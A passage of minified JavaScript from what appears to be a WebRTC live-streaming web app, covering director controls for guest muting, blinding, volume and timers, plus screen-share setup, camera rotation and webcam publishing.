Timer</span>',ele.classList.add("blue")):3==ele.value&&(ele.value=1,msg.resumeClock=!0,resumeClock(),session.roomTimer?session.roomTimer>0?session.roomTimer=!1:session.roomTimer=Date.now()/1e3-session.roomTimer:session.roomTimer=!1,ele.innerHTML='<i class="las la-clock"></i><span data-translate="remove-timer"> Remove Timer</span>',ele.classList.add("red")));else if(0==ele.value||2==ele.value){if(!1!==preSetTime)var getTime=preSetTime;else getTime=await promptAlt("Time to set count down timer",!1,!1,parseInt(getById("overlayClockContainer").dataset.initial),!0);if(null===getTime)return;getTime=parseInt(getTime),getById("overlayClockContainer").dataset.initial=getTime,ele.value=1,ele.classList.add("pressed"),ele.ariaPressed="true",ele.classList.remove("red"),session.roomTimer=Date.now()/1e3+getTime,msg.setClock=getTime,setClock(getTime),msg.showClock=!0,showClock(),msg.startClock=!0,startClock(),ele.innerHTML='<i class="las la-clock"></i><span data-translate="remove-timer"> Remove Timer</span>'}else 3==ele.value?(ele.value=1,msg.resumeClock=!0,resumeClock(),session.roomTimer?session.roomTimer>0?session.roomTimer=!1:session.roomTimer=Date.now()/1e3-session.roomTimer:session.roomTimer=!1,ele.innerHTML='<i class="las la-clock"></i><span data-translate="remove-timer"> Remove Timer</span>',ele.classList.add("red")):(ele.value=2,ele.classList.remove("pressed"),ele.ariaPressed="false",session.roomTimer=!1,msg.stopClock=!0,stopClock(),msg.hideClock=!0,hideClock(),ele.innerHTML='<i class="las la-clock"></i><span data-translate="create-timer"> Create Timer</span>');ele.dataset.UUID?session.sendRequest(msg,ele.dataset.UUID):session.sendRequest(msg)}function updateRemoteTimerButton(UUID,currentTime){var elements=document.querySelectorAll('[data-action-type="create-timer"][data--u-u-i-d="'+UUID+'"]');if(elements[0])if(2!=elements[0].value){var time=parseInt(currentTime)||0;if(elements[0].classList.add("pressed"),elements[0].ariaPressed="true",elements[0].value=1,time<0){var seconds=(time*=-1)-60*(minutes=Math.floor(time/60));elements[0].classList.add("red"),elements[0].innerHTML='<i class="las la-clock"></i> -'+minutes+"m : "+zpadTime(seconds)+"s"}else{var minutes;seconds=time-60*(minutes=Math.floor(time/60));elements[0].classList.remove("red"),elements[0].innerHTML='<i class="las la-clock"></i> '+minutes+"m : "+zpadTime(seconds)+"s"}}else elements[0].classList.remove("pressed"),elements[0].ariaPressed="false",elements[0].classList.remove("red"),elements[0].innerHTML='<i class="las la-clock"></i><span data-translate="create-timer"> Create Timer</span>'}function directMute(ele,event=!1){log("mute 2"),event&&(event.ctrlKey||event.metaKey)||(1==ele.value?(ele.value=0,ele.classList.remove("pressed"),ele.ariaPressed="false",miniTranslate(ele,"mute-scene")):(ele.value=1,ele.classList.add("pressed"),ele.ariaPressed="true",miniTranslate(ele,"unmute")));var msg={scene:!0,action:"mute"};for(var uuid in msg.value=ele.value,msg.target=ele.dataset.sid,log(msg),log("ele:"),log(ele),session.pcs)!1!==session.pcs[uuid].scene&&session.sendMessage(msg,uuid);return syncDirectorState(ele),!!msg.value}function requestFileUpload(ele){ele.classList.add("pressed"),ele.ariaPressed="true",ele.disabled=!0,ele.innerHTML='<i class="las la-file-upload"></i><span data-translate="request-upload"> Requesting..</span>',setTimeout((function(ele){try{ele.innerHTML='<i class="las la-file-upload"></i><span data-translate="request-upload"> Request File</span>',ele.classList.remove("pressed"),ele.ariaPressed="false",ele.disabled=!1}catch(e){}}),15e3,ele);var msg={requestUpload:!0};msg.UUID=ele.dataset.UUID,session.sendRequest(msg,ele.dataset.UUID)}function remoteSpeakerMute(ele,event=!1){log("speaker mute"),event&&(event.ctrlKey||event.metaKey)||(1==ele.value?(ele.value=0,ele.classList.remove("pressed"),ele.ariaPressed="false",ele.innerHTML='<i class="las la-volume-off"></i> <span data-translate="toggle-remote-speaker">Deafen</span>'):(ele.value=1,ele.classList.add("pressed"),ele.ariaPressed="true",ele.innerHTML='<i class="las la-volume-off"></i> <span data-translate="undeafen">Undeafen</span>'),miniTranslate(ele));var msg={};return 0==ele.value?msg.speakerMute=!1:msg.speakerMute=!0,msg.UUID=ele.dataset.UUID,session.sendRequest(msg,ele.dataset.UUID),syncDirectorState(ele),errorlog(msg),msg.speakerMute}function updateRemoteSpeakerMute(UUID){var ele=document.querySelectorAll('[data-action-type="toggle-remote-speaker"][data--u-u-i-d="'+UUID+'"]');return ele[0]&&(ele[0].classList.add("pressed"),ele[0].ariaPressed="true",ele[0].value=1,ele[0].innerHTML='<i class="las la-volume-off"></i> <span data-translate="undeafen">undeafen</span>',miniTranslate(ele[0])),!0}function updateRemoteDisplayMute(UUID,blind=!0){var ele=document.querySelectorAll('[data-action-type="toggle-remote-display"][data--u-u-i-d="'+UUID+'"]');return!!ele[0]&&(blind?(ele[0].classList.add("pressed"),ele[0].ariaPressed="true",ele[0].value=1,ele[0].innerHTML='<i class="las la-eye-slash"></i> <span data-translate="unblind">unblind</span>',miniTranslate(ele[0]),!0):(ele[0].classList.remove("pressed"),ele[0].ariaPressed="false",ele[0].value=0,ele[0].innerHTML='<i class="las la-eye"></i> <span data-translate="blind">blind</span>',miniTranslate(ele[0]),!1))}function blindAllGuests(ele,event=!1){if(session.director){log("blind all display mute"),event&&(event.ctrlKey||event.metaKey)||(1==ele.value?(ele.value=0,ele.classList.remove("pressed"),ele.ariaPressed="false",ele.classList.remove("red"),ele.innerHTML='<i class="toggleSize las la-eye"></i>'):(ele.value=1,ele.classList.add("pressed"),ele.ariaPressed="true",ele.classList.add("red"),ele.innerHTML='<i class="toggleSize las la-eye-slash"></i>'));var msg={};for(var UUID in 0==ele.value?(msg.displayMute=!1,session.directorBlindAllGuests=!1):(msg.displayMute=!0,session.directorBlindAllGuests=!0),session.rpcs)if(!(session.directorList.indexOf(UUID)>=0))try{session.sendRequest(msg,UUID),updateRemoteDisplayMute(UUID,msg.displayMute)}catch(e){errorlog(e)}return syncDirectorState(ele),msg.displayMute}session.cleanOutput||warnUser("Only a director can mute other guests")}function remoteDisplayMute(ele,event=!1){log("display mute"),event&&(event.ctrlKey||event.metaKey)||(1==ele.value?(ele.value=0,ele.classList.remove("pressed"),ele.ariaPressed="false",ele.innerHTML='<i class="las la-eye-slash"></i> <span data-translate="toggle-remote-display">Blind</span>'):(ele.value=1,ele.classList.add("pressed"),ele.ariaPressed="true",ele.innerHTML='<i class="las la-eye-slash"></i> <span data-translate="unblind">Unblind</span>'),miniTranslate(ele));var msg={};return 0==ele.value?msg.displayMute=!1:msg.displayMute=!0,msg.UUID=ele.dataset.UUID,session.sendRequest(msg,ele.dataset.UUID),syncDirectorState(ele),msg.displayMute}function remoteLowerhands(UUID){var msg={lowerhand:!0};msg.UUID=UUID,session.sendRequest(msg,UUID);try{getById("hands_"+UUID).classList.add("hidden"),session.rpcs[UUID].remoteRaisedHandElement.classList.add("hidden")}catch(e){}return!0}function remoteMute(ele,event=!1,skipSend=!1){log("mute");var val=parseInt(ele.value)||0;event&&(event.ctrlKey||event.metaKey)||(1==val?(ele.value=0,ele.classList.remove("pressed"),ele.ariaPressed="false",miniTranslate(ele,"mute")):(ele.value=1,ele.classList.add("pressed"),ele.ariaPressed="true",miniTranslate(ele,"unmute")));try{session.rpcs[ele.dataset.UUID].directorMutedState=ele.value;var volume=session.rpcs[ele.dataset.UUID].directorVolumeState}catch(e){errorlog(e);volume=100}if(!skipSend){var msg={};msg.volume=1==val?volume:0,msg.UUID=ele.dataset.UUID,session.sendRequest(msg,ele.dataset.UUID),syncDirectorState(ele),log(msg)}return 1==session.rpcs[ele.dataset.UUID].directorMutedState?(pokeIframeAPI("director-mute-state",!0,ele.dataset.UUID),pokeAPI("directorMuted",!0,session.rpcs[ele.dataset.UUID].streamID)):(pokeIframeAPI("director-mute-state",!1,ele.dataset.UUID),pokeAPI("directorMuted",!1,session.rpcs[ele.dataset.UUID].streamID)),!!val}function toggleQualityGear3(){if(toggle(document.getElementById("videoSettings3"),inline=!1),"inline-block"===getById("gear_webcam3").style.display){var videoSelect=document.querySelector("select#videoSource3").options,obscam=!1;log(videoSelect[videoSelect.selectedIndex].text),(videoSelect[videoSelect.selectedIndex].text.startsWith("OBS-Camera")||videoSelect[videoSelect.selectedIndex].text.startsWith("OBS Virtual Camera"))&&(obscam=!0),updateStats(obscam)}}function remoteHideVideo(ele,event=!1,skipSend=!1){if(log("video hide"),!event||event.ctrlKey||event.metaKey)return miniTranslate(ele.children[1],"armed"),ele.classList.add("armed"),Callbacks.push([remoteHideVideo,ele,!1]),void log("video queued");1==ele.value?(ele.value=0,ele.classList.remove("pressed"),ele.ariaPressed="false",ele.innerHTML='<i class="las la-user-slash"></i> <span data-translate="hide-guest" >Hide</span>'):(ele.value=1,ele.classList.add("pressed"),ele.ariaPressed="true",ele.innerHTML='<i class="las la-user-slash"></i> <span data-translate="unhide-guest" >Unhide</span>'),miniTranslate(ele),ele.classList.remove("armed");var msg={};if(0==ele.value?msg.directVideoMuted=!1:msg.directVideoMuted=!0,!skipSend){for(var i in session.pcs){msg.target=ele.dataset.UUID,i===msg.target&&(msg.target=!0);try{session.pcs[i].sendChannel.send(JSON.stringify(msg))}catch(e){}}syncDirectorState(ele)}return pokeIframeAPI("director-video-hide-state",msg.directVideoMuted,ele.dataset.UUID),pokeAPI("directorVideoHide",msg.directVideoMuted,session.rpcs[ele.dataset.UUID].streamID),msg.directVideoMuted}function remoteMuteVideo(ele,event=!1,skipSend=!1){if(log("video mute"),!event||event.ctrlKey||event.metaKey)return miniTranslate(ele.children[1],"armed"),ele.classList.add("armed"),Callbacks.push([remoteMuteVideo,ele,!1]),void log("video queued");1==ele.value?(ele.value=0,ele.classList.remove("pressed"),ele.ariaPressed="false",ele.innerHTML='<i class="las la-video-slash"></i> <span data-translate="mute-video-guest" >Video off</span>'):(ele.value=1,ele.classList.add("pressed"),ele.ariaPressed="true",ele.innerHTML='<i class="las la-video-slash"></i> <span data-translate="unmute-video-guest" >Video on</span>'),miniTranslate(ele),ele.classList.remove("armed");var msg={};return 0==ele.value?msg.remoteVideoMuted=!1:msg.remoteVideoMuted=!0,skipSend||(session.sendRequest(msg,ele.dataset.UUID),syncDirectorState(ele)),pokeIframeAPI("remote-video-mute-state",msg.remoteVideoMuted,ele.dataset.UUID),pokeAPI("remoteVideoMuted",msg.remoteVideoMuted,session.rpcs[ele.dataset.UUID].streamID),msg.remoteVideoMuted}function updateDirectorVideoHide(UUID){var ele=document.querySelectorAll('[data-action-type="hide-guest"][data--u-u-i-d="'+UUID+'"]');return ele[0]&&(ele[0].value=1,ele[0].classList.add("pressed"),ele[0].ariaPressed="true",ele[0].innerHTML='<i class="las la-user-slash"></i> <span data-translate="unhide-guest" >Unhide</span>',miniTranslate(ele[0])),!0}function updateDirectorVideoMute(UUID){var ele=document.querySelectorAll('[data-action-type="mute-video-guest"][data--u-u-i-d="'+UUID+'"]');return ele[0]&&(ele[0].value=1,ele[0].classList.add("pressed"),ele[0].ariaPressed="true",ele[0].innerHTML='<i class="las la-video-slash"></i> <span data-translate="unmute-video-guest" >Video on</span>',miniTranslate(ele[0])),!0}function directVolume(ele){log("volume");var msg={scene:!0,action:"volume"};for(var uuid in msg.target=ele.dataset.sid,msg.value=ele.value,session.pcs)!1!==session.pcs[uuid].scene&&session.sendMessage(msg,uuid);return syncDirectorState(ele),msg.value}function applyMuteState(UUID){if(!(UUID in session.rpcs))return"UUID not found";var muteOutcome=session.rpcs[UUID].mutedState||session.rpcs[UUID].mutedStateMixer||session.rpcs[UUID].mutedStateScene||session.speakerMuted||session.rpcs[UUID].bandwidthMuted;if(muteOutcome||!1===session.noaudio||(!0===session.noaudio?muteOutcome=!0:session.noaudio.length?"streamID"in session.rpcs[UUID]&&session.rpcs[UUID].streamID&&!session.noaudio.includes(session.rpcs[UUID].streamID)&&(muteOutcome=!0):muteOutcome=!0),session.rpcs[UUID].videoElement){if(session.rpcs[UUID].videoElement&&!0===session.rpcs[UUID].videoElement.usermuted)return"usermuted true";session.rpcs[UUID].videoElement.muted=muteOutcome}return muteOutcome}function checkMuteState(UUID){return UUID in session.rpcs&&(session.rpcs[UUID].mutedState||session.rpcs[UUID].mutedStateMixer||session.rpcs[UUID].mutedStateScene||session.speakerMuted||session.rpcs[UUID].bandwidthMuted)}function remoteVolumeUI(ele){return ele.nextElementSibling.innerHTML=ele.value+"%",Date.now()-remoteSliderTimeout>100&&(remoteSliderTimeout=Date.now(),remoteVolume(ele)),ele.value}function remoteVolume(ele){log("volume: "+session.rpcs[ele.dataset.UUID].directorMutedState);var msg={};return 1==session.rpcs[ele.dataset.UUID].directorMutedState?session.rpcs[ele.dataset.UUID].directorVolumeState=ele.value:(session.rpcs[ele.dataset.UUID].directorVolumeState=ele.value,msg.volume=ele.value,msg.UUID=ele.dataset.UUID,session.sendRequest(msg,ele.dataset.UUID)),pokeIframeAPI("director-volume-state",ele.value,ele.dataset.UUID),syncDirectorState(ele),ele.value}function clearDirectorSettings(){removeStorage("directorCustomize"),removeStorage("directorWebsiteShare")}function saveDirectorSettings(){var settings={};getById("customizeLinks").classList.contains("hidden")&&(settings.customizeLinks=!0);var customizeLinks1=getById("customizeLinks1").querySelectorAll("input");settings.customizeLinks1={};for(var i=0;i<customizeLinks1.length;i++)settings.customizeLinks1[customizeLinks1[i].dataset.param]=customizeLinks1[i].checked;var customizeLinks3=getById("customizeLinks3").querySelectorAll("input");settings.customizeLinks3={};for(i=0;i<customizeLinks3.length;i++)settings.customizeLinks3[customizeLinks3[i].dataset.param]=customizeLinks3[i].checked;var directorLinks1=getById("directorLinks1").querySelectorAll("input");settings.directorLinks1={};for(i=0;i<directorLinks1.length;i++)settings.directorLinks1[directorLinks1[i].dataset.param]=directorLinks1[i].checked;var directorLinks2=getById("directorLinks2").querySelectorAll("input");settings.directorLinks2={};for(i=0;i<directorLinks2.length;i++)settings.directorLinks2[directorLinks2[i].dataset.param]=directorLinks2[i].checked;setStorage("directorCustomize",settings)}function loadDirectorSettings(){var settings=getStorage("directorCustomize");if(log("LOAD DIRECTOR SETTING"),settings.customizeLinks)try{hideDirectorinvites(getById("directorLinksButton"),!1)}catch(e){errorlog(e)}if(settings.customizeLinks1){var customizeLinks1=getById("customizeLinks1");Object.keys(settings.customizeLinks1).forEach(((key,index)=>{try{customizeLinks1.querySelector('[data-param="'+key+'"]').checked!=settings.customizeLinks1[key]&&(customizeLinks1.querySelector('[data-param="'+key+'"]').checked=settings.customizeLinks1[key],customizeLinks1.querySelector('[data-param="'+key+'"]').onchange())}catch(e){errorlog(e)}}))}if(settings.customizeLinks3){var customizeLinks3=getById("customizeLinks3");Object.keys(settings.customizeLinks3).forEach(((key,index)=>{try{customizeLinks3.querySelector('[data-param="'+key+'"]').checked==settings.customizeLinks3[key]&&(customizeLinks3.querySelector('[data-param="'+key+'"]').checked=settings.customizeLinks3[key],customizeLinks3.querySelector('[data-param="'+key+'"]').onchange())}catch(e){errorlog(e)}}))}if(settings.directorLinks1){var directorLinks1=getById("directorLinks1");Object.keys(settings.directorLinks1).forEach(((key,index)=>{try{directorLinks1.querySelector('[data-param="'+key+'"]').checked==settings.directorLinks1[key]&&(directorLinks1.querySelector('[data-param="'+key+'"]').checked=settings.directorLinks1[key],directorLinks1.querySelector('[data-param="'+key+'"]').onchange())}catch(e){errorlog("key :"+key),errorlog(e)}}))}if(settings.directorLinks2){var directorLinks2=getById("directorLinks2");Object.keys(settings.directorLinks2).forEach(((key,index)=>{try{directorLinks2.querySelector('[data-param="'+key+'"]').checked==settings.directorLinks2[key]&&(directorLinks2.querySelector('[data-param="'+key+'"]').checked=settings.directorLinks2[key],directorLinks2.querySelector('[data-param="'+key+'"]').onchange())}catch(e){errorlog("key :"+key),errorlog(e)}}))}}function sendChat(chatmessage="hi",UUID=!1,overlay=!1){log("Chat message");var msg={};return msg.chat=chatmessage,msg.overlay=overlay,session.sendPeers(msg,UUID),!0}var activatedStream=!1;async function publishScreen(){if(1!=activatedStream){activatedStream=!0,setTimeout((function(){activatedStream=!1}),1e3),formSubmitting=!1;var quality=0;document.getElementById("webcamquality2")&&(quality=parseInt(document.getElementById("webcamquality2").elements.namedItem("resolution2").value)||0),session.quality_ss=quality,!1!==session.quality&&(quality=session.quality),!1!==session.screensharequality&&(quality=session.screensharequality);var video={};-1==quality||(0==quality?(video.width={ideal:1920},video.height={ideal:1080}):1==quality?(video.width={ideal:1280},video.height={ideal:720}):2==quality?(video.width={ideal:640},video.height={ideal:360}):quality>=3?(video.width={ideal:320},video.height={ideal:180}):(video.width={min:640},video.height={min:360})),session.width&&(video.width={ideal:session.width}),session.height&&(video.height={ideal:session.height});var constraints={audio:{echoCancellation:!1,autoGainControl:!1,noiseSuppression:!1},video:video};!0===session.noiseSuppression&&(constraints.audio.noiseSuppression=!0),!0===session.autoGainControl&&(constraints.audio.autoGainControl=!0),!0===session.echoCancellation&&(constraints.audio.echoCancellation=!0);try{let supportedConstraints=navigator.mediaDevices.getSupportedConstraints();supportedConstraints.cursor&&(session.screensharecursor?constraints.video.cursor=["always","motion"]:constraints.video.cursor="never"),session.suppressLocalAudioPlayback&&supportedConstraints.suppressLocalAudioPlayback&&(constraints.audio.suppressLocalAudioPlayback=!0),session.preferCurrentTab&&(constraints.preferCurrentTab=!0),session.selfBrowserSurface&&(constraints.selfBrowserSurface=session.selfBrowserSurface),session.surfaceSwitching&&(constraints.surfaceSwitching=session.surfaceSwitching),session.systemAudio&&(constraints.systemAudio=session.systemAudio),session.displaySurface&&supportedConstraints.displaySurface&&(constraints.video.displaySurface=session.displaySurface)}catch(e){warnlog("navigator.mediaDevices.getSupportedConstraints() not supported")}var overrideFramerate=!1;!1!==session.frameRate&&0!=session.maxframeRate?(overrideFramerate=session.frameRate,constraints.video.frameRate={ideal:session.maxframeRate,max:session.maxframeRate}):!1!==session.frameRate?constraints.video.frameRate=session.frameRate:0!=session.maxframeRate?constraints.video.frameRate={ideal:session.maxframeRate,max:session.maxframeRate}:constraints.video.frameRate={ideal:60};var audioSelect=getById("audioSourceScreenshare"),outputSelect=getById("outputSourceScreenshare");try{session.sink=outputSelect.options[outputSelect.selectedIndex].value,log("Session Sink: "+session.sink),saveSettings()}catch(e){warnlog(e)}return await publishScreen2(constraints,audioSelect,!0,overrideFramerate).then((res=>{if(0!=res)return log("streamID is: "+session.streamID),session.transcript&&setTimeout((function(){setupClosedCaptions()}),1e3),session.cleanOutput?session.cleanish&&!1!==session.recordLocal?(getById("recordLocalbutton").classList.remove("hidden"),getById("mutebutton").classList.add("hidden"),getById("mutespeakerbutton").classList.add("hidden"),getById("chatbutton").classList.add("hidden"),getById("mutevideobutton").classList.add("hidden"),getById("hangupbutton").classList.add("hidden"),getById("hangupbutton2").classList.add("hidden"),getById("controlButtons").classList.remove("hidden"),getById("settingsbutton").classList.add("hidden"),getById("screenshare2button").classList.add("hidden"),getById("screensharebutton").classList.add("hidden"),getById("screenshare3button").classList.add("hidden"),getById("queuebutton").classList.add("hidden")):getById("controlButtons").classList.add("hidden"):(getById("mutebutton").classList.remove("hidden"),getById("mutespeakerbutton").classList.remove("hidden"),getById("chatbutton").className="float",getById("sharefilebutton").classList.remove("hidden"),getById("mutevideobutton").className="float",getById("hangupbutton").className="float",session.showSettings&&(getById("settingsbutton").className="float"),session.raisehands&&(getById("raisehandbutton").className="float"),session.pptControls&&(getById("pptbackbutton").classList.remove("hidden"),getById("pptnextbutton").classList.remove("hidden")),!1!==session.recordLocal&&getById("recordLocalbutton").classList.remove("hidden"),session.screensharebutton&&(getById("screensharebutton").className="float"),getById("controlButtons").classList.remove("hidden"),getById("helpbutton").style.display="inherit",getById("reportbutton").style.display=""),!0===session.chatbutton?(getById("chatbutton").classList.remove("hidden"),getById("controlButtons").classList.remove("hidden")):!1===session.chatbutton&&getById("chatbutton").classList.add("hidden"),!0===session.screensharebutton&&(getById("controlButtons").classList.remove("hidden"),getById("screensharebutton").className="float"),!0===session.hangupbutton&&(getById("controlButtons").classList.remove("hidden"),getById("hangupbutton").className="float"),getById("head1").className="hidden",getById("head2").className="hidden",res})).catch((()=>{}))}}function getWidth(){return Math.max(document.body.scrollWidth,document.documentElement.scrollWidth,document.body.offsetWidth,document.documentElement.offsetWidth,document.documentElement.clientWidth)}function getHeight(){return Math.max(document.documentElement.clientHeight)}function updateForceRotate(skipLastBit=!1){var capabilities={facingMode:"unknown"},FirefoxSucks=!1;if(session.orientation){try{var track=!1;if(session.streamSrc){var tracks=session.streamSrc.getVideoTracks();tracks.length&&(track=tracks[0])}if(!track)return;const settings=track.getSettings();if(session.currentCameraConstraints=settings,screen&&screen.orientation&&screen.orientation.type?screen.orientation.type.includes("portrait")||session.currentCameraConstraints&&session.currentCameraConstraints.aspectRatio&&(session.currentCameraConstraints.aspectRatio=1/session.currentCameraConstraints.aspectRatio):window.matchMedia("(orientation: portrait)").matches||session.currentCameraConstraints&&session.currentCameraConstraints.aspectRatio&&(session.currentCameraConstraints.aspectRatio=1/session.currentCameraConstraints.aspectRatio),session.forceRotate=0,track.getCapabilities){if(capabilities=track.getCapabilities(),"width"in settings){if(!("height"in settings))return;settings.width<settings.height?"landscape"==session.orientation?capabilities&&("environment"==capabilities.facingMode?session.forceRotate=270:session.forceRotate=90):session.forceRotate=0:settings.width>settings.height&&"portrait"==session.orientation?capabilities&&("environment"==capabilities.facingMode?session.forceRotate=90:session.forceRotate=270):session.forceRotate=0}}else{if(!Firefox||!session.mobile)return;try{(vs1=document.getElementById("videoSourceSelect")||document.getElementById("videoSource3"))&&((vs1=vs1.options[vs1.selectedIndex].textContent).includes(" back")?(capabilities={facingMode:"environment"},FirefoxSucks=2):vs1.includes(" front")&&(capabilities={facingMode:"user"},FirefoxSucks=1)),getById("videosource").style.transform="","landscape"==session.orientation&&(1===FirefoxSucks?(session.forceRotate=90,getById("videosource").style.transform="rotate(90deg)"):2===FirefoxSucks&&(getById("videosource").style.transform="rotate(270deg)",session.forceRotate=270))}catch(e){}}var msg={};!1!==session.forceRotate?session.rotate?msg.rotate_video=session.forceRotate+parseInt(session.rotate):msg.rotate_video=session.forceRotate:msg.rotate_video=session.rotate,msg.rotate_video&&msg.rotate_video>=360&&(msg.rotate_video-=360);var msgEncoded=JSON.stringify(msg);for(var UUID in session.pcs)try{session.pcs[UUID].rotation!=msg.rotate_video&&(session.pcs[UUID].sendChannel.send(msgEncoded),session.pcs[UUID].rotation=msg.rotate_video)}catch(e){session.pcs[UUID].startTime+1e5<Date.now()?warnlog("RTC Connection seems to be dead or not yet open? 8"):log("RTC Connection seems to be dead or not yet open? 8")}}catch(e){errorlog(e)}Firefox&&session.mobile||updateForceRotatedCSS()}else if(Firefox&&session.mobile)try{var vs1;(vs1=document.getElementById("videoSourceSelect")||document.getElementById("videoSource3"))&&((vs1=vs1.options[vs1.selectedIndex].textContent).includes(" back")?FirefoxSucks=2:vs1.includes(" front")&&(FirefoxSucks=1)),screen&&screen.orientation&&screen.orientation.type?screen.orientation.type.includes("portrait")?session.forceRotate=0:screen.orientation.type.includes("landscape")&&(1===FirefoxSucks?session.forceRotate=90:2===FirefoxSucks&&(session.forceRotate=270)):window.matchMedia("(orientation: portrait)").matches?session.forceRotate=0:window.matchMedia("(orientation: landscape)").matches&&(1===FirefoxSucks?session.forceRotate=90:2===FirefoxSucks&&(session.forceRotate=270));msg={};if(!1!==session.forceRotate){session.rotate?msg.rotate_video=session.forceRotate+parseInt(session.rotate):msg.rotate_video=session.forceRotate,msg.rotate_video&&msg.rotate_video>=360&&(msg.rotate_video-=360),warnlog("FIREFOX MOBILE ONLY ROTATE: "+msg.rotate_video);msgEncoded=JSON.stringify(msg);for(var UUID in session.pcs)try{session.pcs[UUID].rotation!=msg.rotate_video&&(session.pcs[UUID].sendChannel.send(msgEncoded),session.pcs[UUID].rotation=msg.rotate_video)}catch(e){session.pcs[UUID].startTime+1e5<Date.now()?warnlog("RTC Connection seems to be dead or not yet open? 8"):log("RTC Connection seems to be dead or not yet open? 8")}}}catch(e){}skipLastBit||(applyMirror(session.mirrorExclude),session.setResolution())}function updateForceRotatedCSS(rotateThis=session.forceRotate){270==rotateThis?(document.body.setAttribute("style","transform: rotate(270deg);position: absolute;top: 100vh;left: 0;height: 100vw;width: 100vh;transform-origin: 0 0;"),document.body.dataset.rotated="1"):90==rotateThis?(document.body.setAttribute("style","transform: rotate(90deg);position: absolute;top: 0;left: 100vw;height: 100vw;width: 100vh;transform-origin: 0 0;"),document.body.dataset.rotated="1"):180==rotateThis?(document.body.setAttribute("style","transform: rotate(180deg);position: absolute;top: 100vh;left: 100vw;height: 100vh;width: 100vw;transform-origin: 0 0;"),document.body.dataset.rotated=""):(document.body.setAttribute("style",""),document.body.dataset.rotated="")}async function joinDataMode(){await session.connect(),session.roomid?(getById("head3").classList.add("hidden"),getById("head3a").classList.add("hidden"),joinRoom(session.roomid)):session.view?(window.onresize=updateMixer,play(),!1!==session.permaid&&session.postPublish()):!1!==session.permaid&&session.postPublish()}function publishWebcam(btn=!1,miconly=!1){if(btn){if("false"==btn.dataset.ready)return void warnlog("Clicked too quickly; button not enabled yet");getById("passwordBasicInput").value.length&&(session.password=getById("passwordBasicInput").value,session.password=sanitizePassword(session.password),0==session.password.length?session.password=!1:(session.defaultPassword=!1,urlParams.has("pass")?updateURL("pass="+session.password):urlParams.has("pw")?updateURL("pw="+session.password):urlParams.has("p")?updateURL("p="+session.password):updateURL("password="+session.password)))}if(1!=activatedStream){if(activatedStream=!0,log("PRESSED PUBLISH WEBCAM!!"),formSubmitting=!1,window.scrollTo(0,0),getById("head2").className="hidden",!1!==session.roomid){if(window.onresize=updateMixer,window.onorientationchange=function(){Firefox&&updateForceRotate(!0),setTimeout((async function(){session.forceAspectRatio&&await updateCameraConstraints("aspectRatio",session.forceAspectRatio),session.effect&&"7"===session.effect&&digitalZoom(!0),updateForceRotate(),updateMixer()}),200)},""!==session.roomid||session.view&&""!==session.view)log("ROOM ID ENABLED"),log("Update Mixer Event on REsize SET"),getById("main").style.overflow="hidden",5==session.stereo&&(""===session.roomid?session.stereo=1:session.stereo=3),joinRoom(session.roomid),""!==session.roomid&&(session.cleanOutput||(getById("head2").className="")),getById("head3").classList.add("hidden"),getById("head3a").classList.add("hidden");else if(null===session.manual&&(session.manual=!0),!session.cleanOutput){var showReshare=getStorage("showReshare");showReshare&&generateHash(session.streamID+session.salt+"bca321",4).then((function(hash){showReshare===hash&&(getById("head3").classList.remove("hidden"),getById("head3a").classList.remove("hidden"))})).catch(errorlog)}}else null===session.manual&&(session.manual=!0),getById("head3").classList.remove("hidden"),getById("head3a").classList.remove("hidden"),getById("logoname").style.display="none",generateHash(session.streamID+session.salt+"bca321",4).then((function(hash){setStorage("showReshare",hash,720)})).catch(errorlog);if(log("streamID is: "+session.streamID),getById("head1").className="hidden",session.cleanOutput?session.cleanish&&!1!==session.recordLocal?(getById("recordLocalbutton").classList.remove("hidden"),getById("mutebutton").classList.add("hidden"),getById("mutespeakerbutton").classList.add("hidden"),getById("chatbutton").classList.add("hidden"),getById("mutevideobutton").classList.add("hidden"),getById("hangupbutton").classList.add("hidden"),getById("hangupbutton2").classList.add("hidden"),getById("controlButtons").classList.remove("hidden"),getById("settingsbutton").classList.add("hidden"),getById("screenshare2button").classList.add("hidden"),getById("screensharebutton").classList.add("hidden"),getById("queuebutton").classList.add("hidden")):getById("controlButtons").classList.add("hidden"):(getById("mutebutton").classList.remove("hidden"),getById("mutespeakerbutton").classList.remove("hidden"),getById("chatbutton").className="float",getById("sharefilebutton").classList.remove("hidden"),getById("mutevideobutton").className="float",getById("hangupbutton").className="float",session.showSettings&&(getById("settingsbutton").className="float"),session.raisehands&&(getById("raisehandbutton").className="float"),session.pptControls&&(getById("pptbackbutton").classList.remove("hidden"),getById("pptnextbutton").classList.remove("hidden")),!1!==session.recordLocal&&getById("recordLocalbutton").classList.remove("hidden"),session.screensharebutton&&(session.roomid?3===session.screenshareType?(getById("screenshare3button").className="float",getById("screensharebutton").className="float hidden",getById("screenshare2button").className="float hidden"):1===session.screenshareType?(getById("screensharebutton").className="float",getById("screenshare3button").className="float hidden",getById("screenshare2button").className="float hidden"):2===session.screenshareType?(getById("screenshare2button").className="float",getById("screensharebutton").className="float hidden",getById("screenshare3button").className="float hidden"):(getById("screenshare3button").className="float",getById("screensharebutton").className="float hidden",getById("screenshare2button").className="float hidden"):(getById("screensharebutton").className="float",getById("screenshare2button").className="float hidden",getById("screenshare3button").className="float hidden")),getById("controlButtons").classList.remove("hidden"),getById("helpbutton").style.display="inherit",getById("reportbutton").style.display=""),!0===session.chatbutton?(getById("chatbutton").classList.remove("hidden"),getById("controlButtons").classList.remove("hidden")):!1===session.chatbutton&&getById("chatbutton").classList.add("hidden"),updatePushId(),session.dataMode)return errorlog("this shoulnd't happen.."),void session.postPublish();session.streamSrc||checkBasicStreamsExist(),Firefox&&session.mobile&&session.streamSrc?setInterval((function(){if(document.getElementById("keepAlivePlayer")&&session.streamSrc)getById("keepAlivePlayer").remove();else if(!document.getElementById("keepAlivePlayer")){let fakeElement=document.createElement("video");fakeElement.autoplay=!0,fakeElement.loop=!0,fakeElement.muted=!0,fakeElement.src="./media/micro.mp4",fakeElement.style.width="1px",fakeElement.style.height="1px",fakeElement.controls=!1,fakeElement.id="keepAlivePlayer",getById("main").appendChild(fakeElement)}}),4e3):!session.avatar&&session.mobile&&session.streamSrc&&!session.streamSrc.getVideoTracks().length&&setInterval((function(){if(document.getElementById("keepAlivePlayer")&&session.streamSrc.getVideoTracks().length)getById("keepAlivePlayer").remove();else if(!document.getElementById("keepAlivePlayer")){let 